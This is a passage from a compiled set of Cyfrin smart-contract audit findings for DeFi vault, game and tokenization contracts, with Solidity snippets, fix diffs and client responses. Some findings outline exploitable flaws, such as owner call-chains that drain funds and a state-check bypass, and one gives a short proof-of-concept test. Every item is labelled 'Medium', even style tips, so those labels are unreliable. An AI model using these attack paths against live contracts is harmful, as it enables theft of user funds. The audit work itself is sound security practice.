71:        uint tokenAssets = IERC4626(token).previewWithdraw(baseAssets);
211:        uint balance = IERC20(vaultAddress).balanceOf(address(this));
219:        uint length = assetsArr.length;
220:        for (uint i = 0; i < length; i++) {
240:    function redeemRequiredBaseAssets (uint baseTokens) internal {
241:        for (uint i = 0; i < assetsArr.length; i++) {
243:            uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));

predeposit/pUSDeVault.sol
62:            uint total_sUSDe = sUSDe.balanceOf(address(this));
63:            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);
65:            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);
67:            uint y_pUSDeShares = balanceOf(caller);
68:            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);
121:            uint sUSDeAssets = sUSDe.previewWithdraw(assets);
138:        uint USDeBalance = USDe.balanceOf(address(this));
171:        uint USDeBalance = USDe.balanceOf(address(this));

predeposit/yUSDeVault.sol
38:        uint pUSDeAssets = super.totalAssets();
39:        uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);
43:    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
44:        uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets);
45:        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);
59:        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);
60:        uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor);
74:        uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil);
75:        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);

```

**Strata:** Fixed in commit [61f5910](https://github.com/Strata-Money/contracts/commit/61f591088754e2666355307cf1e11e6440af8572).

**Cyfrin:** Verified.

## [M-97] Use named returns where this can eliminate in-function variable declaration
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Use named returns where this can eliminate in-function variable declaration:

* `yUSDeVault` : functions `totalAccruedUSDe`, `_convertAssetsToUSDe`, `previewDeposit`, `previewMint`
* `pUSDeVault` : function `previewYield`
* `MetaVault` : functions `deposit`, `mint`, `withdraw`, `redeem`

**Strata:** Fixed in commits [3241635](https://github.com/Strata-Money/contracts/commit/32416357ac166b072e4339471107e40950952a08) and [c68a705](https://github.com/Strata-Money/contracts/commit/c68a7053097a1909c13c98b6a5678a102f3f5007).

**Cyfrin:** Verified.

## [M-98] Use unchained initializers instead
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** The direct use of initializer functions rather than their unchained equivalents should be avoided to prevent [potential duplicate initialization](https://docs.openzeppelin.com/contracts/5.x/upgradeable#multiple-inheritance).

**Strate:**
Fixed in commit [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e).

**Cyfrin:** Verified.

## [M-99] `Default Session::assert Results` should verify input `session Id` belongs to a game associated with its instance
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `DefaultSession::assertResults` doesn't verify that the input `sessionId` belongs to a game associated with that instance of `DefaultSession`.

But different games can be associated with different instances of DefaultSession; see `SessionManager::getSessionStrategy`.

Consider this scenario:
* there are 2 games G1 and G2, each associated with a different instance of `DefaultSession` DS1 and DS2 but both DS1 and DS2 are associated with the same instance of `SessionManager`
* a good user calls `DS1::assertResults` with valid results to assert the results for G1
* a malicious user copies the exact inputs and calls `DS2::assertResults` with valid results to also assert the results for G1

In this state both DS1 and DS2 can have recorded winners for G1, even though DS2 isn't the correct strategy for G1.

This doesn't appear to be further abusable as `SessionManager::claimRewards` always gets the correct strategy instance and prevents winners from claiming more than once, but it doesn't seem like a good idea to allow this.

**Recommended Mitigation:** `DefaultSession::assertResults` should verify input `sessionId` belongs to a game associated with its instance.

**Majority Games:**
Fixed in commit [462c01a](https://github.com/Engage-Protocol/engage-protocol/commit/462c01a157f287014e14585bbb4008379a3126c2).

**Cyfrin:** Verified.

## [M-100] `Session Manager::reveal Game Question` doesn't validate that input `_question Id` belongs to input `_game Id`
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `SessionManager::revealGameQuestion` doesn't validate that input `_questionId` belongs to input `_gameId`. It calls `QuestionManager::_revealPrompt` which ends up calling the `revealQuestion` function of the relevant prompt contract, but none of these verify that the input `_questionId` belongs to input `_gameId`.

**Impact:** A game creator can bypass the requirement that a game must be in the `Ongoing` state in order to reveal questions, by calling `SessionManager::revealGameQuestion` with `_gameId` of another game that is in the `Ongoing` state even if their game is not.

**Recommended Mitigation:** * Verify that the input `_questionId` belongs to input `_gameId` and consider applying the same fix such that it is also enforced for `startAndRevealGameQuestion`. One way to do this is by adding this check inside `QuestionManager::_revealPrompt`:
```diff
    function _revealPrompt(uint256 _gameId, uint256 _questionId, bytes memory _prompt, uint256 _salt) internal {
        PromptInitData storage promptInitData = questionCommitment[_questionId];
+       require(
+               _gameId == promptInitData.sessionId,
+               InvalidSessionIdForQuestion(_questionId, _gameId, promptInitData.sessionId)
+       );
```

* Consider also restricting functions such as `startAndRevealGameQuestion` and `revealGameQuestion` using the `onlyCreator` modifier - though technically this shouldn't be strictly necessary as only the game creator possesses the necessary salts.

**Majority Games:**
Fixed in commit [15a2459](https://github.com/Engage-Protocol/engage-protocol/commit/15a24591dd9e1987e0f5383cc2d7de28e3072c77).

**Cyfrin:** Verified.

\clearpage

## [M-101] Array length checks in `Fixed Ranks Reward::get Rewards`, `get Reward` check against the wrong comparator
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** The check in `FixedRanksReward::getRewards` should compare using `>=` against input `winners.length`:
```diff
-        require(rankedRewards[sessionId].length > 0, RankedRewardsNotSet(sessionId));
+        require(rankedRewards[sessionId].length >= winners.length, RankedRewardsNotSet(sessionId));
```

Similarly the check in `FixedRanksReward::getReward` should compare using `>` against input `position`:
```diff
-       require(rankedRewards[sessionId].length > 0, RankedRewardsNotSet(sessionId));
+       require(rankedRewards[sessionId].length > position, RankedRewardsNotSet(sessionId));
```

The error should likely be changed to `PositionNotInRankedRewards` or something similar.

**Majority Games:**
Fixed in commit [6717163](https://github.com/Engage-Protocol/engage-protocol/commit/6717163d9d0fbe98a8c2af006b00da9edc20796f).

**Cyfrin:** Verified.

## [M-102] Don't copy entire `Assertion` struct from `storage` to `memory` in `Default Session::assertion Resolved Callback`
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** The `Assertion` struct is defined as:
```solidity
struct Assertion {
    uint256 sessionId;
    string resultCid;
    string calculationCid;
    address asserter;
    bool resolved;
    address[] winners;
    uint256[] totalXPs;
    uint256[] totalTimes;
}
```

It is very inefficient to copy this entire struct from `storage` to `memory`. Yet `DefaultSession::assertionResolvedCallback` does exactly this even though it only needs 4 fields:
```solidity
if (assertedTruthfully) {
    assertions[assertionId].resolved = true;
    Assertion memory dataAssertion = assertions[assertionId];
    emit DataAssertionResolved(
        dataAssertion.sessionId,
        dataAssertion.resultCid,
        dataAssertion.calculationCid,
        dataAssertion.asserter,
        assertionId
    );
    recordResults(assertions[assertionId].sessionId, assertionId);
```

**Recommended Mitigation:** Use a storage reference like this:
```diff
        if (assertedTruthfully) {
            assertions[assertionId].resolved = true;
-           Assertion memory dataAssertion = assertions[assertionId];
+           Assertion storage dataAssertion = assertions[assertionId];
            emit DataAssertionResolved(
                dataAssertion.sessionId,
                dataAssertion.resultCid,
                dataAssertion.calculationCid,
                dataAssertion.asserter,
                assertionId
            );
```

**Majority Games:**
Fixed in commit [fc5e0fa](https://github.com/Engage-Protocol/engage-protocol/commit/fc5e0faa81eae1edbef05d47c2e7652a236a7895).

**Cyfrin:** Verified.

\clearpage

## [M-103] Fix comment in `reveal Solution`
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** The comment above `revealSolutions` says it is is meant to be called by the session manager but that's not true anymore, anyone can call it.

**Majority Games:**
Fixed in commit [acb42cb](https://github.com/Engage-Protocol/engage-protocol/commit/acb42cbc4422d6ade640864b4d74dd3beffbcebc).

**Cyfrin:** Verified.

## [M-104] In Solidity don't initialize to default values
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** In Solidity don't initialize to default values:
```solidity
session/DefaultSession.sol
125:        for (uint256 i = 0; i < questionIds.length; ++i) {
172:        for (uint256 i = 0; i < assertion.winners.length; ++i) {
174:            for (uint256 j = 0; j < questionIds.length; ++j) {

QuestionManager.sol
50:        for (uint256 i = 0; i < _questionHashes.length; i++) {

SessionManager.sol
154:    bool public livenessRequired = false;
159:    bool public creationSunsetted = false;
248:        for (uint256 i = 0; i < _promptStrategies.length; i++) {
366:        for (uint256 i = 0; i < questionIds.length; i++) {
438:        for (uint256 i = 0; i < questions.length; i++) {
474:        for (uint256 i = 0; i < questions.length; i++) {
549:        for (uint256 i = 0; i < _gameIds.length; i++) {

prompt/TriviaChoicePrompt.sol
108:        for (uint256 i = 0; i < questionIds.length; i++) {

offchain/uma/SessionResultAsserter.sol
121:        for (uint256 i = 0; i < addresses.length; i++) {
133:        for (uint256 i = 0; i < data.length; i++) {

reward/ProportionalToXPReward.sol
44:        for (uint256 i = 0; i < winners.length; ++i) {
50:        for (uint256 i = 0; i < winners.length; ++i) {
65:        for (uint256 i = 0; i < winners.length; ++i) {

reward/FixedRanksReward.sol
57:        uint256 totalPoints = 0;
58:        for (uint256 i = 0; i < _rankedRewards.length; ++i) {
76:        for (uint256 i = 0; i < winners.length; ++i) {
```

**Majestic Games:**
Fixed in commit [6686df5](https://github.com/Engage-Protocol/engage-protocol/commit/6686df583945b33ab7ab2ad64e432c0395fabeb4).

**Cyfrin:** Verified.

## [M-105] No validation on `reaction Deadline` allows multiple griefing scenarios
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** When a creator creates a game they send an array of bytes32  `promptHash`  variables associated with the questions:
```solidity
 function createGame(
        uint256 _startTime,
        uint256 _endTime,
        uint256 _ticketPrice,
        uint256 _creatorFee,
        address _token,
        address _creatorFeeReceiver,
        bytes32[] memory _promptHashes, <-----
        address[] memory _promptStrategies,
        address _sessionStrategy,
        address _rewardStrategy,
        bool _verificationRequired
    ) external returns (uint256 gameId) {...}
```

These `promptHash` are then reveled in the `_revealPrompt` function when creator call `startAndRevealGameQuestion` or `revealGameQuestion`, the `_revealPrompt` is checking the ` keccak256(abi.encodePacked(_prompt, _salt)) == promptInitData.promptHash` and calls `revealQuestion` in the strategies:
```solidity
 function revealQuestion(bytes memory question, uint256 questionId) external {
        Prompt memory q = abi.decode(question, (Prompt));  <------
        require(registry.engageProtocols(msg.sender), InvalidSessionManager(msg.sender));
        require(q.sessionManager == msg.sender, OnlySessionManager(q.sessionManager, msg.sender));
        (, address promptStrategy) = SessionManager(q.sessionManager).questionCommitment(questionId);
        require(promptStrategy == address(this), InvalidPromptCall(questionId, promptStrategy));
        revealedQuestions[questionId] = q;
        revealedAt[questionId] = block.timestamp;
    }
```

The input parameter `bytes memory question` is decoded and converted in the `Prompt`  struct:
```solidity
struct Prompt {
        address sessionManager;
        uint256 gameId;
        string questionText;
        uint256 reactionDeadline;  <-----
        string finalizedAnswer;
        string[] media; <------
        string[] choices; <------
    }
```

**Impact:** * the possible range of values for `reactionDeadline` is never validated; if the game creator sets it to 0 or `type(uint256).max` then answering questions will always revert; users will be unable to earn xp but the game can still be concluded by the game creator in order to prevent users from claiming refunds from their fees

* `media` and `choices` should be validated to have the same length; creator owner can make mistakes setting up the questions  and don't set properly this values making users harder to respond and probably lead to loss of funds(since users have not the choices and media set up they probably answer wrong).

Both cases can result in loss of funds for users.

**Proof of Concept:** Run this proof of concept in `SessionManagerEndGame.t.sol`
```solidity
 function test_zero_reactionDeadline() public {
        question.reactionDeadline = 0;
        bytes memory qEncoded = abi.encode(question);
        bytes32 questionHash = keccak256(abi.encodePacked(qEncoded, salt));
        promptHashes[0] = questionHash;
        promptStrategies[0] = promptStrategy;

        _createGame();
        _startGame();
        _warpToEndTime();

        sessionManager.endGame(1);
    }
```

**Recommended Mitigation:** Validate that:
* `string[] media ` and `string[] choices` are equal in length
* `reactionDeadline` is within an admin-controlled minimum & maximum range
* `reactionDeadline` does not extend past a game's `endTime`

**Majority Games:**
Fixed in commit [4cb2e42](https://github.com/Engage-Protocol/engage-protocol/commit/4cb2e42fa67194bea32775cba86c15045a2f56ba) by restricting `reactionDeadline`. Note that `media` and `choices` are not necessarily related, it's up to the creator & presentation frontend to make it work in a meaningful way.

**Cyfrin:** Verified.

## [M-106] Perform input-related checks prior to reading storage
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Since reading from storage is expensive, it is more efficient to "fail fast" by performing input-related checks prior to reading storage:

* `SessionManager.sol`:
```solidity
// in `createGame`, perform this check before all the others
require(_promptStrategies.length == _promptHashes.length, ArrayLengthMismatch());
```

**Majority Games:**
Fixed in commit [02b8fd8](https://github.com/Engage-Protocol/engage-protocol/commit/02b8fd81a5098d581332aecc00d28437e2dc631b).

**Cyfrin:** Verified.

## [M-107] Prefer `calldata` to `memory` for external read-only function inputs
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Prefer `calldata` to `memory` for external read-only function inputs:
* `SessionManager::createGame` & `QuestionManager::_commitQuestions`:
```solidity
224:        bytes32[] memory _promptHashes,
225:        address[] memory _promptStrategies,

45:    function _commitQuestions(uint256 _gameId, bytes32[] memory _questionHashes, address[] memory _promptStrategies)
```

* `DefaultSession::setXPTiers`:
```solidity
100:    function setXPTiers(uint256 gameId, uint256[] memory _xpTiers) external {
```

**Majestic Games:**
Fixed in commit [be290a6](https://github.com/Engage-Protocol/engage-protocol/commit/be290a6eae3b11b32c40699af6b7d072bbcf85d3).

**Cyfrin:** Verified.

## [M-108] Remove obsolete `return` statements when using named return values
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Remove obsolete `return` statements when using named return values in:
* `DefaultSession::_calculatePlayerSessionResult`

**Majority Games:**
Fixed in commit [cc1c9d1](https://github.com/Engage-Protocol/engage-protocol/commit/cc1c9d17c69b817de2ff03e2b64ce5519a14df15).

**Cyfrin:** Verified.

## [M-109] Use named mappings to explicitly denote the purpose of keys and values
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Use named mappings to explicitly denote the purpose of keys and values; the protocol does use named mappings in some places but not others:
```solidity
session/DefaultSession.sol
60:    mapping(uint256 gameId => uint256[]) public xpTiers;

QuestionManager.sol
39:    mapping(uint256 => uint256[]) public gameQuestions;
40:    mapping(uint256 => PromptInitData) public questionCommitment;

Registry.sol
29:    mapping(address => bool) public promptStrategies;
30:    mapping(address => bool) public sessionStrategies;
31:    mapping(address => bool) public rewardStrategies;
32:    mapping(address => bool) public paymentTokens;
33:    mapping(address => bool) public engageProtocols;

DepositManager.sol
72:    mapping(uint256 => mapping(address => bool)) public hasClaimed;
77:    mapping(uint256 => mapping(address => bool)) public hasRefunded;

SessionManager.sol
164:    mapping(uint256 => Game) public games;
174:    mapping(address => bool) public isVerificationApproved;
179:    mapping(address => uint256 timestamp) public liveness;

reward/FixedRanksReward.sol
29:    mapping(uint256 sessionId => uint256[]) public rankedRewards;

offchain/uma/SessionResultAsserter.sol
30:    mapping(bytes32 => Assertion) public assertions;
```

**Majority Games:**
Fixed in commit [130e0a3](https://github.com/Engage-Protocol/engage-protocol/commit/130e0a33b69cc7381a0eea12719f14156bcc3446) where we felt this added value.

**Cyfrin:** Verified.

## [M-110] User can join after the first question is revealed to gain an advantage over other users
- Severity: `Medium`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** Users can join a game while the game is ongoing:
```solidity
 function joinGame(uint256 _gameId) external {
        require(
            games[_gameId].state == SessionState.Created || games[_gameId].state == SessionState.Ongoing,
            InvalidGameState(SessionState.Created, games[_gameId].state)
        );
    }
```

`SessionManager::startAndRevealGameQuestion` both moves the game to the `Ongoing` state and reveals the first question.

**Impact:** A user can get an unfair advantage over others by always waiting for the first question to be revealed, and only joining a game if they know the answer to that question.

**Recommended Mitigation:** Consider don't allow user join to the game when the game is already ongoing:

```diff
  function joinGame(uint256 _gameId) external {
-      require(
-            games[_gameId].state == SessionState.Created || games[_gameId].state == SessionState.Ongoing,
-            InvalidGameState(SessionState.Created, games[_gameId].state)
-        );
+      require(
+            games[_gameId].state == SessionState.Created,
+            InvalidGameState(SessionState.Created, games[_gameId].state)
+        );
```

**Majority Games:**
Fixed in commit [6ec205f](https://github.com/Engage-Protocol/engage-protocol/commit/6ec205f68d5f0d2bcf25035d5da09fe859f065b7).

**Cyfrin:** Verified.

## [M-111] `Securitize Amm Nav Provider` quote functions don't reflect execution behavior due to missing baseline reset logic
- Severity: `Medium`
- Source report: `ramp.md`

### Detailed Content (from source)
**Description:** `SecuritizeAmmNavProvider::quoteBuyBase, quoteSellBase` are supposed to provide price quotes, however they don't simulate the behavior of `_checkAndResetBaseline` which is executed by actual buys and sells performed via `executeBuyBase, executeSellBase`.

**Impact:** Actual price execution can differ from the quoted price; the quotes may not be accurate because they don't simulate the `_checkAndResetBaseline` logic.

**Recommended Mitigation:** Either document this limitation clearly or implement the baseline reset simulation in quote functions (though this adds complexity to `view` functions).

**Securitize:** Fixed in commits [71e40b8](https://bitbucket.org/securitize_dev/bc-nav-provider-sc/commits/71e40b8fd5387aa8382cb85fe0de0c89ad399125), [d05482b](https://bitbucket.org/securitize_dev/bc-nav-provider-sc/commits/d05482b2d42a2c9df7451affb634444e5f545f51).

**Cyfrin:** Verified.

## [M-112] Better storage packing by changing declaration order
- Severity: `Medium`
- Source report: `ramp.md`

### Detailed Content (from source)
**Description:** Better storage packing by changing declaration order:
* `2-nav-provider/contracts/nav/SecuritizeAmmNavProvider.sol` - declare `lastMarketStatus` immediately after `asset`:
```solidity
IERC20Metadata public asset;
uint8 public lastMarketStatus;
```

**Securitize:** Fixed in commit [41815fa](https://bitbucket.org/securitize_dev/bc-nav-provider-sc/commits/41815fa7c45fe54ed46ed3d87aa81ea1a57af3fb).

**Cyfrin:** Verified.

## [M-113] In Solidity don't initialize to default values
- Severity: `Medium`
- Source report: `ramp.md`

### Detailed Content (from source)
**Description:** In Solidity don't initialize to default values:
```solidity
SecuritizeAmmNavProvider.sol
380:        bool shouldReset = false;

off-ramp/BaseOffRamp.sol
124:        for (uint256 i = 0; i < _countries.length; i++) {
```

**Securitize:** Fixed in commits [7594671](https://bitbucket.org/securitize_dev/bc-nav-provider-sc/commits/75946718b5129603545c364a2d9c6f57902200d9), [6833173](https://github.com/securitize-io/bc-on-off-ramp-sc/commit/68331735079e5964e636c6f139e44649c7903483).

**Cyfrin:** Verified.

## [M-114] Upgradeable contracts which are inherited from should use ERC7201 namespaced storage layouts or storage gaps to prevent storage collision
- Severity: `Medium`
- Source report: `ramp.md`

### Detailed Content (from source)
**Description:** The protocol has upgradeable contracts which other contracts inherit from. These contracts should either use:
* [ERC7201](https://eips.ethereum.org/EIPS/eip-7201) namespaced storage layouts - [example](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L60-L72)
* storage gaps (though this is an [older and no longer preferred](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-5.0#Namespaced) method)

The ideal mitigation is that all upgradeable contracts use ERC7201 namespaced storage layouts; without using one of the above two techniques storage collision can occur during upgrades. The affected contracts are:

* `1-onoff-ramp/contracts/on-ramp/BaseOnRamp.sol` inherited by `PublicStockOnRamp.sol` which has its own state

**Securitize:** Fixed in commit [1656d74](https://github.com/securitize-io/bc-on-off-ramp-sc/commit/1656d7494ff4129a1c77dc7d46a58a5999e9b9c4).

**Cyfrin:** Verified.

## [M-115] Use named return variables where this can refactor away local variables
- Severity: `Medium`
- Source report: `ramp.md`

### Detailed Content (from source)
**Description:** Use named return variables where this can refactor away local variables:
* `CountryValidator::getCountry`
* `PublicStockOnRamp::calculateDsTokenAmount` - read result of `navProvider.quoteBuyBase` directly into `rate` and remove local variable `execPrice`

**Securitize:** Fixed in commit [f6055a0](https://github.com/securitize-io/bc-on-off-ramp-sc/commit/f6055a0a59d63360a6bd8c6aee6c8ca3631832e7).

**Cyfrin:** Verified.

## [M-116] `Transaction Relayer` and `Securitize Swap` should use `Common Utils::encode String`
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** `TransactionRelayer::toBytes32` duplicates functionality already available in `CommonUtils::encodeString`; remove the duplicated code and use `CommonUtils::encodeString` instead.

Also this line should use `CommonUtils::encodeString` instead of re-implementing it again:
```solidity
L178:                        keccak256(abi.encodePacked(senderInvestor)),
```

`SecuritizeSwap` also duplicates this functionality:
```solidity
191:                keccak256(abi.encodePacked(_senderInvestorId))
```

**Securitize:** Fixed in commit [1f69125](https://github.com/securitize-io/dstoken/commit/1f691255378a0deba62281755feb3a28339b194e) for `TransactionRelayer`. `SecurtizeSwap` was removed as it was deprecated.

**Cyfrin:** Verified.

## [M-117] More efficient way of checking for empty string in `Common Utils::is Empty String`
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** More efficient way of checking for empty string in `CommonUtils::isEmptyString`:
```solidity
function isEmptyString(string memory _str) internal pure returns (bool) {
    return bytes(_str).length == 0;
}
```

**Securitize:** Fixed in commit [22b117a](https://github.com/securitize-io/dstoken/commit/22b117a3514c04b766aa7be6c855683865549e82).

**Cyfrin:** Verified.

## [M-118] Remove obsolete `return` statements when already using named return variables
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** Remove obsolete `return` statements when already using named return variables.

* `contracts/utils/BulkBalanceChecker.sol`
```solidity
43:        return balances;
```

* `contracts/swap/SecuritizeSwap.sol`
```solidity
236:       return (dsTokenAmount, currentNavRate);
```

**Securitize:** Fixed in commit [f3daea2](https://github.com/securitize-io/dstoken/commit/f3daea22479e95886f25e2c3a70b9618fed97a1c) for `BulkBalanceChecker`; `SecuritizeSwap` was deleted as it is obsolete.

**Cyfrin:** Verified.

## [M-119] Remove return value from `DSToken::update Investor Balance` as it is never checked
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** `DSToken::updateInvestorBalance` is an `internal` function which returns `bool` but this return value is never checked anywhere; remove it:
```solidity
token/DSToken.sol
304:        updateInvestorBalance(_from, _value, CommonUtils.IncDec.Decrease);
305:        updateInvestorBalance(_to, _value, CommonUtils.IncDec.Increase);
308:    function updateInvestorBalance(address _wallet, uint256 _value, CommonUtils.IncDec _increase) internal override returns (bool) {

mocks/StandardTokenMock.sol
72:    function updateInvestorBalance(address, uint256, CommonUtils.IncDec) internal pure override returns (bool) {

token/TokenLibrary.sol
94:        updateInvestorBalance(_tokenData, IDSRegistryService(_services[REGISTRY_SERVICE]), _params._to, shares, CommonUtils.IncDec.Increase);
129:        updateInvestorBalance(
165:        updateInvestorBalance(
193:        updateInvestorBalance(_tokenData, registryService, _from, _shares, CommonUtils.IncDec.Decrease);
194:        updateInvestorBalance(_tokenData, registryService, _to, _shares, CommonUtils.IncDec.Increase);
197:    function updateInvestorBalance(TokenData storage _tokenData, IDSRegistryService _registryService, address _wallet, uint256 _shares, CommonUtils.IncDec _increase) internal returns (bool) {

token/IDSToken.sol
131:    function updateInvestorBalance(address _wallet, uint256 _value, CommonUtils.IncDec _increase) internal virtual returns (bool);
```

The current return value can also be misleading, for example if `_wallet` doesn't belong to an investor then the update never happens but it still returns `true`:
```solidity
function updateInvestorBalance(address _wallet, uint256 _value, CommonUtils.IncDec _increase) internal override returns (bool) {
    string memory investor = getRegistryService().getInvestor(_wallet);
    // @audit if `_wallet` doesn't belong to an investor, no update occurs
    if (!CommonUtils.isEmptyString(investor)) {
        uint256 balance = balanceOfInvestor(investor);
        if (_increase == CommonUtils.IncDec.Increase) {
            balance += _value;
        } else {
            balance -= _value;
        }

        ISecuritizeRebasingProvider rebasingProvider = getRebasingProvider();

        uint256 sharesBalance = rebasingProvider.convertTokensToShares(balance);

        tokenData.investorsBalances[investor] = sharesBalance;
    }
    // @audit but the function still returns `true` which is misleading
    return true;
}
```

So it seems simpler to just remove the `bool` return value as it isn't ever read anyway and this is an internal function which doesn't affect public interfaces.

**Securitize:** Fixed in commit [2219e9a](https://github.com/securitize-io/dstoken/commit/2219e9a14207b4b1faf3f1c35409771cc23251b6).

**Cyfrin:** Verified.

\clearpage

## [M-120] Remove setting deprecated `last Updated By` in Registry Service
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** The client has informed us that `lastUpdatedBy` is deprecated so it should not be updated in `RegistryService`:
```solidity
registry/RegistryService.sol
113:        investors[_id].lastUpdatedBy = msg.sender;
140:        investors[_id].lastUpdatedBy = msg.sender;
```

Additionally a comment should be placed to indicate this in the relevant data store:
```solidity
data-stores/RegistryServiceDataStore.sol
33:        address lastUpdatedBy;
40:        address lastUpdatedBy;
```

Or the storage slots should be renamed to `DEPRECATED_lastUpdatedBy` as has been done in other places for deprecated storage slots.

**Securitize:** Fixed in commit [9a80a47](https://github.com/securitize-io/dstoken/commit/9a80a478fffcf7ef81e5c0ca229ab2ff4efc7b9e) by no longer writing to `lastUpdatedBy` and in commit [e6165e4](https://github.com/securitize-io/dstoken/commit/e6165e4ae5c29ca1787bbf90dd62c83a6e915ba6) by renaming the variable to explicitly indicate it is deprecated.

**Cyfrin:** Verified.

## [M-121] Use named imports
- Severity: `Medium`
- Source report: `rebasing.md`

### Detailed Content (from source)
**Description:** The codebase in some places used named imports but not in others; recommend using named imports everywhere.

**Securitize:** Fixed in commit [7fc22e2](https://github.com/securitize-io/dstoken/commit/7fc22e2bb994e071fae8f241b8558d10d199529a).

**Cyfrin:** Verified.

## [M-122] Don't initialize to default values
- Severity: `Medium`
- Source report: `registry.md`

### Detailed Content (from source)
**Description:** In Solidity don't initialize to default values:
```solidity
registry/GlobalRegistryService.sol
169:        for (uint8 i = 0; i < walletAddresses.length; i++) {
```

**Securitize:** Fixed in commit [5713fd2](https://github.com/securitize-io/bc-global-registry-service-sc/commit/5713fd25851f6a437b45d947f5d4652f2450fb10).

**Cyfrin:** Verified.

## [M-123] Use event indexing for faster off-chain parameter lookup
- Severity: `Medium`
- Source report: `registry.md`

### Detailed Content (from source)
**Description:** Events in `IGlobalRegistryService` should use `indexed` keywords on the 3 most important parameters per event to enable faster lookup by those parameters off-chain.

**Securitize:** Fixed in commit [0c2321a](https://github.com/securitize-io/bc-global-registry-service-sc/commit/0c2321ab92e5bd47a602d55e765f18d8b7e7fbdf).

**Cyfrin:** Verified.

## [M-124] `Sherpa Vault::redeem` naming ambiguous
- Severity: `Medium`
- Source report: `sherpa.md`

### Detailed Content (from source)
**Description:** `SherpaVault` uses ERC-4626-adjacent terminology but different semantics. In ERC-4626, `redeem` means burning shares to withdraw assets. In `SherpaVault`, `redeem` means finalize a prior deposit by moving unredeemed shares into the user’s wallet. This naming can mislead integrators and tooling that assume ERC-4626 behavior.

Consider renaming `redeem` to `finalizeDeposit` / `claimShares` to prevent confusion.

**Sherpa:** Fixed in commit [`8e9ba92`](https://github.com/hedgemonyxyz/sherpa-vault-smartcontracts/commit/8e9ba923e8402b877e16cd1d9a89143acdafe855)

**Cyfrin:** Verified. `claimShares` now used.

## [M-125] Owner can chain admin calls for same-block drains
- Severity: `Medium`
- Source report: `sherpa.md`

### Detailed Content (from source)
**Description:** The protocol’s admin controls let the owner chain privileged calls across the vault and wrapper in a single transaction:

* **Vault path:** Call `SherpaVault::setStableWrapper` to switch which token is protected from rescue. Then immediately call `SherpaVault::rescueTokens` to withdraw any balance of the old wrapper from the vault.
* **Wrapper operator path:** Call `SherpaUSD::setOperator`, then (as operator) use `SherpaUSD::transferAsset` to move USDC out of the wrapper.
* **Wrapper keeper path:** Call `SherpaUSD::setKeeper`, then use `SherpaUSD::depositToVault` to pull USDC from users who left approvals, mint SherpaUSD to the keeper, and extract value via the `transferAsset` path above.

All of these are owner-only and have no built-in delay, so they can be executed together in the same block.

**Impact:** Even though the code comments stress limiting owner power, the owner (or a compromised key) can immediately redirect custody and move funds with no user warning or reaction time. This creates a trust gap between stated intent and actual authority.

**Recommended Mitigation:** * Add a delay (at least one withdrawal epoch) to `SherpaVault.setStableWrapper`, `SherpaVault.rescueTokens`, `SherpaUSD.setOperator`, `SherpaUSD.setKeeper`, and consider delaying `SherpaUSD.transferAsset`.
* Make `SherpaVault.stableWrapper`, `SherpaUSD.keeper` immutable.
* Use a timelock (e.g., OpenZeppelin [`TimelockController`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/governance/TimelockController.sol)) with a user-protective delay so people can withdraw or reduce approvals before changes take effect.

**Sherpa:**
> Vault path: Call SherpaVault::setStableWrapper to switch which token is protected from rescue. Then immediately call SherpaVault::rescueTokens to withdraw any balance of the old wrapper from the vault.
> Wrapper keeper path: Call SherpaUSD::setKeeper, then use SherpaUSD::depositToVault to pull USDC from users who left approvals, mint SherpaUSD to the keeper, and extract value via the transferAsset path above.

We're implementing a pseudo-immutable `stableWrapper` and `keeper` - both will be set once during deployment and cannot be changed after system initialization. This eliminates both attack surfaces while maintaining the deployment flexibility needed to solve the chicken-and-egg deployment problem: vault constructor requires wrapper address, but we can't deploy wrapper until vault exists. We solve this by deploying vault with a temporary wrapper address, then calling `setStableWrapper()` once to set the real wrapper and lock it permanently.

> Wrapper operator path: Call SherpaUSD::setOperator, then (as operator) use SherpaUSD::transferAsset to move USDC out of the wrapper.

